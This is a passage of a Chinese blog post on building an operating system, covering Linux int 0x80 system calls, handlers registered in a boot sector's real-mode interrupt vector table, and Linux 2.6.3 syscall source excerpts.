task.c</span><br><span class="line">    ├── lib</span><br><span class="line">    │   ├── string.c</span><br><span class="line">    │   └── vsprintf.c</span><br><span class="line">    ├── makefile</span><br><span class="line">    └── tests</span><br><span class="line">        ├── test</span><br><span class="line">        └── test.c</span><br><span class="line"></span><br><span class="line">11 directories, 48 files</span><br></pre></td></tr></table></figure><p>文件启动方式</p><p><img src="https://img.joe1sn.top/uploads/medium/3837d7a429b759b50b95cfa9462e3104.png" alt="" /></p><h2 id="引用"><a class="markdownIt-Anchor" href="#引用"></a> 引用</h2><p><a href="https://en.wikipedia.org/wiki/X86_calling_conventions#syscall">https://en.wikipedia.org/wiki/X86_calling_conventions#syscall</a></p><p><a href="https://github.com/StevenBaby/onix">https://github.com/StevenBaby/onix</a></p><h1 id="操作系统实现-中断与系统调用"><a class="markdownIt-Anchor" href="#操作系统实现-中断与系统调用"></a> 操作系统实现-中断与系统调用</h1><h2 id="使用linux的系统调用"><a class="markdownIt-Anchor" href="#使用linux的系统调用"></a> 使用Linux的系统调用</h2><p>从汇编出发，一般来说的第一个程序是hello_world</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[bits 32]</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">    mov ebx, 0</span><br><span class="line">    mov ecx, message</span><br><span class="line">    mov edx, 13</span><br><span class="line">    mov eax, 4</span><br><span class="line">    int 0x80</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">section .data</span><br><span class="line">message:</span><br><span class="line">    db &quot;hello world&quot;,10,13,0</span><br></pre></td></tr></table></figure><p>这里使用了linux的int 0x80系统调用（调用表：<a href="https://www.joe1sn.top/int80.html">https://www.joe1sn.top/int80.html</a> ），调用的是write</p><table><thead><tr><th style="text-align:left">%eax</th><th style="text-align:left">Name</th><th style="text-align:left">Source</th><th style="text-align:left">%ebx</th><th style="text-align:left">%ecx</th><th style="text-align:left">%edx</th><th style="text-align:left">%ecx</th><th style="text-align:left">%edi</th></tr></thead><tbody><tr><td style="text-align:left">1</td><td style="text-align:left">sys_exit</td><td style="text-align:left">kernel/exit.c</td><td style="text-align:left">int</td><td style="text-align:left">-</td><td style="text-align:left">-</td><td style="text-align:left">-</td><td style="text-align:left">-</td></tr><tr><td style="text-align:left">2</td><td style="text-align:left">sys_fork</td><td style="text-align:left">arch/i386/kernel/process.c</td><td style="text-align:left"><a href="http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html#pt_regs">struct pt_regs</a></td><td style="text-align:left">-</td><td style="text-align:left">-</td><td style="text-align:left">-</td><td style="text-align:left">-</td></tr><tr><td style="text-align:left">3</td><td style="text-align:left">sys_read</td><td style="text-align:left">fs/read_write.c</td><td style="text-align:left">unsigned int</td><td style="text-align:left">char *</td><td style="text-align:left"><a href="http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html#size_t">size_t</a></td><td style="text-align:left">-</td><td style="text-align:left">-</td></tr><tr><td style="text-align:left">4</td><td style="text-align:left">sys_write</td><td style="text-align:left">fs/read_write.c</td><td style="text-align:left">unsigned int</td><td style="text-align:left">const char *</td><td style="text-align:left"><a href="http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html#size_t">size_t</a></td><td style="text-align:left">-</td><td style="text-align:left">-</td></tr></tbody></table><ul><li><strong>ebx</strong>是选择IO通道（那个流）</li><li><strong>ecx</strong>是字符串的物理位置</li><li><strong>edx</strong>是要打印的字符个数</li><li><strong>eax</strong>是int 0x80要选择的系统调用号</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf32 hello_world.asm -o hello_world.o &amp;&amp; ld -m elf_i386 hello_world.o -o hello_world &amp;&amp; ./hello_world</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/b75fc84205e4d9c4d1265a530a4bd26d.png" alt="image-20220313105810181" /></p><p>因为我们直返回后程序没有退出的指令，所以出现了段错误</p><p>再次使用exit系统调用就可以避免这个错误了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[bits 32]</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">    mov ebx, 0</span><br><span class="line">    mov ecx, message</span><br><span class="line">    mov edx, 13</span><br><span class="line">    mov eax, 4</span><br><span class="line">    int 0x80</span><br><span class="line">    mov eax, 1</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">section .data</span><br><span class="line">message:</span><br><span class="line">    db &quot;hello world&quot;,10,13,0</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/c359edc5b5ffeebe0188226b9f2ef777.png" alt="image-20220313110225693" /></p><h2 id="实现一个系统调用"><a class="markdownIt-Anchor" href="#实现一个系统调用"></a> 实现一个系统调用</h2><p><strong>系统调用是基于中断实现的</strong></p><p>一个普遍的思想就是操作系统是一个死循环，当满足一个条件时，中断循环去执行触发的功能(函数)（windows的点击-&gt;打开一个窗口），执行完成过后回到死循环。</p><p>修改我们的<code>src/boot/boot.asm</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">[org 0x7c00]</span><br><span class="line">;最简单的主程序引导程序</span><br><span class="line">;实模式的启动地址</span><br><span class="line"></span><br><span class="line">;设置屏幕模式为文本模式，清除屏幕</span><br><span class="line">mov ax,3</span><br><span class="line">int 0x10</span><br><span class="line"></span><br><span class="line">;初始化段寄存器</span><br><span class="line">mov ax,0</span><br><span class="line">mov ds,ax</span><br><span class="line">mov es,ax</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,0x7c00</span><br><span class="line"></span><br><span class="line">xchg bx,bx</span><br><span class="line"></span><br><span class="line">mov word [0x80 * 4], interrupt</span><br><span class="line">mov word [0x80 * 4 + 2], 0</span><br><span class="line">int 0x80    ;linux系统调用 invoke 注册cs:ip</span><br><span class="line"></span><br><span class="line">;程序悬停</span><br><span class="line">jmp $</span><br><span class="line"></span><br><span class="line">interupt:</span><br><span class="line">    mov si, string</span><br><span class="line">    call print</span><br><span class="line">    xchg bx,bx</span><br><span class="line">    iret    ;中断返回</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;实模式的打印</span><br><span class="line">print:</span><br><span class="line">    mov ah, 0xe;功能参数</span><br><span class="line">    .next:</span><br><span class="line">        mov al, [si];字符</span><br><span class="line">        cmp al, 0;判断是否为最后一个结尾</span><br><span class="line">        jz .done;结尾跳转至ret</span><br><span class="line">        int 0x10;功能调用</span><br><span class="line">        inc si;地址-1</span><br><span class="line">        jmp .next;继续，下一个</span><br><span class="line">    .done:</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line">string:</span><br><span class="line">    db &quot;.&quot;,0; \n\r</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">    mov si, .msg</span><br><span class="line">    call print</span><br><span class="line">    hlt; CPU停止</span><br><span class="line">    jmp $</span><br><span class="line">    .msg db &quot;Kernel Booting Failed&quot;,10,13,0</span><br><span class="line"></span><br><span class="line">;填充</span><br><span class="line">times 510-($-$$) db 0</span><br><span class="line">db 0x55,0xaa</span><br></pre></td></tr></table></figure><p>这里所有的一切都是先入为主的观念，因为我们并不了解上面hello_world的原理，我们在下一节从验证现在了解的知识</p><p>其中有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xchg bx,bx</span><br><span class="line">mov word [0x80 * 4], interrupt</span><br><span class="line">mov word [0x80 * 4 + 2], 0</span><br><span class="line">xchg bx,bx</span><br><span class="line">int 0x80    ;linux系统调用 invoke 注册cs:ip</span><br><span class="line">xchg bx,bx</span><br></pre></td></tr></table></figure><p>我们将0x80*4的位置放入了interrupt的地址，下个断点看一下</p><p><img src="https://img.joe1sn.top/uploads/big/5bcbdc3fdf3c4d74796ce314cdd25910.png" alt="image-20220313170125892" /></p><p>我们成功的将<code>interrupt</code>函数的地址放到了int 0x80调用表的第0个位置，如果我们想使用<code>int 0x70</code>调用，就用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xchg bx,bx</span><br><span class="line">mov word [0x70 * 4], interrupt</span><br><span class="line">mov word [0x70 * 4 + 2], 0</span><br><span class="line">xchg bx,bx</span><br><span class="line">int 0x70    ;invoke 注册cs:ip</span><br><span class="line">xchg bx,bx</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/fc2b29c9bcda56758cab92ce1702892e.png" alt="image-20220313165658110" /></p><p>效果是一样的</p><p>再复习一下之前的知识：ds=0时，ds:0x100 的物理地址是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>∗</mo><mn>010</mn><mi>h</mi><mo>+</mo><mn>100</mn><mi>h</mi><mo>=</mo><mn>100</mn><mi>h</mi></mrow><annotation encoding="application/x-tex">0*010h+100h=100h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord">0</span><span class="mord">1</span><span class="mord">0</span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord mathnormal">h</span></span></span></span></p><p><strong>接着实现除0异常的系统调用</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">[org 0x7c00]</span><br><span class="line">;最简单的主程序引导程序</span><br><span class="line">;实模式的启动地址</span><br><span class="line"></span><br><span class="line">;设置屏幕模式为文本模式，清除屏幕</span><br><span class="line">mov ax,3</span><br><span class="line">int 0x10</span><br><span class="line"></span><br><span class="line">;初始化段寄存器</span><br><span class="line">mov ax,0</span><br><span class="line">mov ds,ax</span><br><span class="line">mov es,ax</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,0x7c00</span><br><span class="line"></span><br><span class="line">; -------------------除0异常</span><br><span class="line">mov word [0 * 4], interrupt</span><br><span class="line">mov word [0 * 4 + 2], 0</span><br><span class="line"></span><br><span class="line">mov dx, 0</span><br><span class="line">mov ax, 1</span><br><span class="line">mov bx, 0</span><br><span class="line">xchg bx, bx</span><br><span class="line">div bx</span><br><span class="line">; -------------------</span><br><span class="line"></span><br><span class="line">;程序悬停</span><br><span class="line">jmp $</span><br><span class="line"></span><br><span class="line">interrupt:</span><br><span class="line">    mov si, string</span><br><span class="line">    call print</span><br><span class="line">    xchg bx,bx</span><br><span class="line">    iret    ;中断返回</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;实模式的打印</span><br><span class="line">print:</span><br><span class="line">    mov ah, 0xe;功能参数</span><br><span class="line">    .next:</span><br><span class="line">        mov al, [si];字符</span><br><span class="line">        cmp al, 0;判断是否为最后一个结尾</span><br><span class="line">        jz .done;结尾跳转至ret</span><br><span class="line">        int 0x10;功能调用</span><br><span class="line">        inc si;地址-1</span><br><span class="line">        jmp .next;继续，下一个</span><br><span class="line">    .done:</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line">string:</span><br><span class="line">    db &quot;.&quot;,0; \n\r</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">    mov si, .msg</span><br><span class="line">    call print</span><br><span class="line">    hlt; CPU停止</span><br><span class="line">    jmp $</span><br><span class="line">    .msg db &quot;Kernel Booting Failed&quot;,10,13,0</span><br><span class="line"></span><br><span class="line">;填充</span><br><span class="line">times 510-($-$$) db 0</span><br><span class="line">db 0x55,0xaa</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov word [0 * 4], interrupt</span><br><span class="line">mov word [0 * 4 + 2], 0</span><br><span class="line"></span><br><span class="line">mov dx, 0</span><br><span class="line">mov ax, 1</span><br><span class="line">mov bx, 0</span><br><span class="line">xchg bx, bx</span><br><span class="line">div bx</span><br></pre></td></tr></table></figure><p>其中对1、2行完成了中断函数的注册（覆盖了原始的除0异常函数），接着就是一个除0异常，我们在interrupt函数处下了断点</p><p><img src="https://img.joe1sn.top/uploads/big/c171bb6bc5e78e60e9a50c2608230dda.png" alt="image-20220313170908757" /></p><p>这样每次除0异常都会调用interrupt函数</p><p><img src="https://img.joe1sn.top/uploads/big/a3ca78b4a211268d982e7d444f6546a0.png" alt="image-20220313171056102" /></p><p>移除所有断点，系统就一直死循环跑</p><p><img src="https://img.joe1sn.top/uploads/big/0212936aa0e6b90152119bdc65d95394.png" alt="image-20220313171211219" /></p><p>程序一直打印.说明<code>iret</code>返回的地址并不是中断发生时后的地址，而是引发异常代码开始的地址，即除0操作的地址</p><p>大意描述为：<code>eip = &amp;div_0</code>，同时我们的操作并没有修改相关寄存器的值，所以这个异常会被一直引发下去。</p><p>目前这个是我们自己注册的系统调用，你是否想过最开始int 0x10的BIOS系统调用是怎么样的？</p><p>这里有bochs实模式下的内存布局情况</p><table><thead><tr><th>起始地址</th><th>结束地址</th><th>大小</th><th>用途</th></tr></thead><tbody><tr><td><code>0x000</code></td><td><code>0x3FF</code></td><td>1KB</td><td>中断向量表</td></tr><tr><td><code>0x400</code></td><td><code>0x4FF</code></td><td>256B</td><td>BIOS 数据区</td></tr><tr><td><code>0x500</code></td><td><code>0x7BFF</code></td><td>29.75 KB</td><td>可用区域</td></tr><tr><td><code>0x7C00</code></td><td><code>0x7DFF</code></td><td>512B</td><td>MBR 加载区域</td></tr><tr><td><code>0x7E00</code></td><td><code>0x9FBFF</code></td><td>607.6KB</td><td>可用区域</td></tr><tr><td><code>0x9FC00</code></td><td><code>0x9FFFF</code></td><td>1KB</td><td>扩展 BIOS 数据区</td></tr><tr><td><code>0xA0000</code></td><td><code>0xAFFFF</code></td><td>64KB</td><td>用于彩色显示适配器</td></tr><tr><td><code>0xB0000</code></td><td><code>0xB7FFF</code></td><td>32KB</td><td>用于黑白显示适配器</td></tr><tr><td><code>0xB8000</code></td><td><code>0xBFFFF</code></td><td>32KB</td><td>用于文本显示适配器</td></tr><tr><td><code>0xC0000</code></td><td><code>0xC7FFF</code></td><td>32KB</td><td>显示适配器 BIOS</td></tr><tr><td><code>0xC8000</code></td><td><code>0xEFFFF</code></td><td>160KB</td><td>映射内存</td></tr><tr><td><code>0xF0000</code></td><td><code>0xFFFEF</code></td><td>64KB-16B</td><td>系统 BIOS</td></tr><tr><td><code>0xFFFF0</code></td><td><code>0xFFFFF</code></td><td>16B</td><td>系统 BIOS 入口地址</td></tr></tbody></table><h2 id="再次回到linux系统调用"><a class="markdownIt-Anchor" href="#再次回到linux系统调用"></a> 再次回到Linux系统调用</h2><p>虽然我的内核版本是Linux ubuntu 5.4.0-100-generic #113~18.04.1-Ubuntu，但是这里用v2.6.3的源代码说明原理</p><p><a href="https://elixir.bootlin.com/linux/v2.6.3/source">/</a><a href="https://elixir.bootlin.com/linux/v2.6.3/source/arch">arch</a>/<a href="https://elixir.bootlin.com/linux/v2.6.3/source/arch/i386">i386</a>/<a href="https://elixir.bootlin.com/linux/v2.6.3/source/arch/i386/kernel">kernel</a>/<a href="https://elixir.bootlin.com/linux/v2.6.3/source/arch/i386/kernel/entry.S">entry.S</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ENTRY(system_call)</span><br><span class="line">pushl %eax<span class="meta"># save orig_eax</span></span><br><span class="line">SAVE_ALL</span><br><span class="line"><span class="title function_">GET_THREAD_INFO</span><span class="params">(%ebp)</span></span><br><span class="line">cmpl $<span class="params">(nr_syscalls)</span>, %eax</span><br><span class="line">jae syscall_badsys</span><br><span class="line"><span class="meta"># system call tracing in operation</span></span><br><span class="line">testb $_TIF_SYSCALL_TRACE,<span class="title function_">TI_FLAGS</span><span class="params">(%ebp)</span></span><br><span class="line">jnz syscall_trace_entry</span><br><span class="line">syscall_call:</span><br><span class="line">call *<span class="title function_">sys_call_table</span><span class="params">(,%eax,<span class="number">4</span>)</span></span><br><span class="line">movl %eax,<span class="title function_">EAX</span><span class="params">(%esp)</span><span class="meta"># store the return value</span></span><br><span class="line">syscall_exit:</span><br><span class="line">cli<span class="meta"># make sure we don<span class="string">&#x27;t miss an interrupt</span></span></span><br><span class="line"><span class="string"><span class="meta"># setting need_resched or sigpending</span></span></span><br><span class="line"><span class="string"><span class="meta"># between sampling and the iret</span></span></span><br><span class="line"><span class="string"><span class="meta">movl TI_FLAGS(%ebp), %ecx</span></span></span><br><span class="line"><span class="string"><span class="meta">testw $_TIF_ALLWORK_MASK, %cx# current-&gt;work</span></span></span><br><span class="line"><span class="string"><span class="meta">jne syscall_exit_work</span></span></span><br><span class="line"><span class="string"><span class="meta">restore_all:</span></span></span><br><span class="line"><span class="string"><span class="meta">RESTORE_ALL</span></span></span><br><span class="line"><span class="string"><span class="meta">......</span></span></span><br><span class="line"><span class="string"><span class="meta">......</span></span></span><br></pre></td></tr></table></figure><p>这里就体现了demo工程与实际工程的不同</p><ul><li>push eax到栈</li><li>保存一些相关的值<a href="https://elixir.bootlin.com/linux/v2.6.3/source">/</a><a href="https://elixir.bootlin.com/linux/v2.6.3/source/arch">arch</a>/<a href="https://elixir.bootlin.com/linux/v2.6.3/source/arch/alpha">alpha</a>/<a href="https://elixir.bootlin.com/linux/v2.6.3/source/arch/alpha/kernel">kernel</a>/<a href="https://elixir.bootlin.com/linux/v2.6.3/source/arch/alpha/kernel/entry.S">entry.S</a></li><li>使用EBP来保存当前线程的信息</li><li>根据EAX的值选择适当的系统调用</li></ul><p><a href="https://elixir.bootlin.com/linux/v2.6.3/source">/</a><a href="https://elixir.bootlin.com/linux/v2.6.3/source/arch">arch</a>/<a href="https://elixir.bootlin.com/linux/v2.6.3/source/arch/um">um</a>/<a href="https://elixir.bootlin.com/linux/v2.6.3/source/arch/um/kernel">kernel</a>/<a href="https://elixir.bootlin.com/linux/v2.6.3/source/arch/um/kernel/sys_call_table.c">sys_call_table.c</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">syscall_handler_t</span> *sys_call_table[] = &#123;</span><br><span class="line">[ __NR_restart_syscall ] = sys_restart_syscall,</span><br><span class="line">[ __NR_exit ] = sys_exit,</span><br><span class="line">[ __NR_fork ] = sys_fork,</span><br><span class="line">[ __NR_read ] = (<span class="type">syscall_handler_t</span> *) sys_read,</span><br><span class="line">[ __NR_write ] = (<span class="type">syscall_handler_t</span> *) sys_write,</span><br><span class="line"></span><br><span class="line"><span class="comment">/* These three are declared differently in asm/unistd.h */</span></span><br><span class="line">[ __NR_open ] = (<span class="type">syscall_handler_t</span> *) sys_open,</span><br><span class="line">[ __NR_close ] = (<span class="type">syscall_handler_t</span> *) sys_close,</span><br><span class="line">[ __NR_waitpid ] = (<span class="type">syscall_handler_t</span> *) sys_waitpid,</span><br><span class="line">[ __NR_creat ] = sys_creat,</span><br><span class="line">[ __NR_link ] = sys_link,</span><br><span class="line">[ __NR_unlink ] = sys_unlink,</span><br><span class="line"></span><br><span class="line"><span class="comment">/* declared differently in kern_util.h */</span></span><br><span class="line">[ __NR_execve ] = (<span class="type">syscall_handler_t</span> *) sys_execve,</span><br><span class="line">[ __NR_chdir ] = sys_chdir,</span><br><span class="line">[ __NR_time ] = um_time,</span><br><span class="line">[ __NR_mknod ] = sys_mknod,</span><br><span class="line">[ __NR_chmod ] = sys_chmod,</span><br><span class="line">[ __NR_lchown ] = sys_lchown16,</span><br><span class="line">[ __NR_break ] = sys_ni_syscall,</span><br><span class="line">[ __NR_oldstat ] = sys_stat,</span><br><span class="line">[ __NR_lseek ] = (<span class="type">syscall_handler_t</span> *) sys_lseek,</span><br><span class="line">[ __NR_getpid ] = sys_getpid,</span><br><span class="line">[ __NR_mount ] = um_mount,</span><br><span class="line">[ __NR_umount ] = sys_oldumount,</span><br><span class="line">[ __NR_setuid ] = sys_setuid16,</span><br><span class="line">    ......</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure><p>这里以<code>sys_write</code>举例说明</p><p><a href="https://elixir.bootlin.com/linux/v2.6.3/source">/</a><a href="https://elixir.bootlin.com/linux/v2.6.3/source/fs">fs</a>/<a href="https://elixir.bootlin.com/linux/v2.6.3/source/fs/read_write.c">read_write.c</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">asmlinkage <span class="type">ssize_t</span> <span class="title function_">sys_write</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> fd, <span class="type">const</span> <span class="type">char</span> __user * buf, <span class="type">size_t</span> count)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line"><span class="type">ssize_t</span> ret = -EBADF;</span><br><span class="line"><span class="type">int</span> fput_needed;</span><br><span class="line"></span><br><span class="line">file = fget_light(fd, &amp;fput_needed);</span><br><span class="line"><span class="keyword">if</span> (file) &#123;</span><br><span class="line">ret = vfs_write(file, buf, count, &amp;file-&gt;f_pos);</span><br><span class="line">fput_light(file, fput_needed);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体链接情况</p><p><img src="https://img.joe1sn.top/uploads/big/a4b581c301038feabbedfae4cb7f02b6.gif" alt="" /></p><p><img src="https://img.joe1sn.top/uploads/big/0493cfc58fa2c4192f33d04d8d2309f5.gif" alt="" /></p><p>这样就实现了一个系统调用</p><h2 id="中断描述符"><a class="markdownIt-Anchor" href="#中断描述符"></a> 中断描述符</h2><p><strong>引发中断的方式</strong></p><ul><li>外中断</li><li>异常</li><li>软中断</li></ul><blockquote><p><strong>外中断</strong>就是由外部中断控制器通知 CPU 需要执行的，CPU 在当前指令执行完成之后，回去检测是否有中断产生，如果有，并且 <code>IF</code> 位有效，也就是允许中断，那么就会执行中断处理函数，这种方式直接的体验就是，CPU 可以在任意两个指令间插入一个中断函数调用，中断函数调用与普通函数调用稍有区别，在调用时栈中多压了一些数据，在中断返回时，会弹出；</p><p>异常和软中断统称为<strong>内中断</strong>，也就是这个中断时 CPU 和 软件内部产生的，与外部硬件无关；</p><p><strong>异常</strong>是 CPU 在执行过程中，执行不下去了，引发的中断调用，比如 除零异常，缺页异常，一般保护错误，有一些异常在处理后程序是可以继续执行的，比如缺页异常，而有一些异常就不行了，比如一般保护，这种情况下一般是软件访问了不该访问的内存或者寄存器，自己没有权限，于是CPU会调用一般保护异常函数，这个函数中，一般会终止该进程的执行，试图访问自己没有权限的内容，应该是危险的程序，可能是恶意程序，或者是程序有漏洞；</p><p><strong>软中断</strong>，可以认为是应用程序和操作系统沟通的一种方式，应用程序运行在较低的特权级，一般来说没有直接访问硬件的权限，当应用程序想要访问硬件的时候，比如典型的读写文件，就需要调用系统调用，系统调用就是用软中断实现的，也就是应用程序调用软中断函数来请求操作系统，以访问硬件，访问硬件的函数是操作系统实现的，于是被认为是安全的，就这样。</p></blockquote><p>从Linux源代码来看，当我们需要实现许多系统调用的时候，可以把所有的系统调用函数的地址写到一张函数表上，实现一个和linux差不多的系统调用表</p><p>对于每一个中断，我们需要一个中断描述符表(interrupte descriptor table. IDT)</p><p>在<a href="https://elixir.bootlin.com/linux/v2.6.3/source">/</a><a href="https://elixir.bootlin.com/linux/v2.6.3/source/arch">arch</a>/<a href="https://elixir.bootlin.com/linux/v2.6.3/source/arch/i386">i386</a>/<a href="https://elixir.bootlin.com/linux/v2.6.3/source/arch/i386/boot">boot</a>/<a href="https://elixir.bootlin.com/linux/v2.6.3/source/arch/i386/boot/setup.S">setup.S</a>初始化了全局描述符和中断描述符</p><figure class="highlight 